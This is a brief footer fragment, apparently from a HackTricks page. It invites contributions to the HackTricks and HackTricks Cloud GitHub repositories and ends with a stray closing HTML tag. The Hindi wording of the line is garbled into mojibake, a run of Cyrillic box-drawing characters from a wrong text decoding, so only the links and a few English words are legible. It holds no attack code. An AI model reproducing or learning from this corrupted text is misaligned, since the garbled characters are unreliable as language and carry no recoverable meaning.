* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>
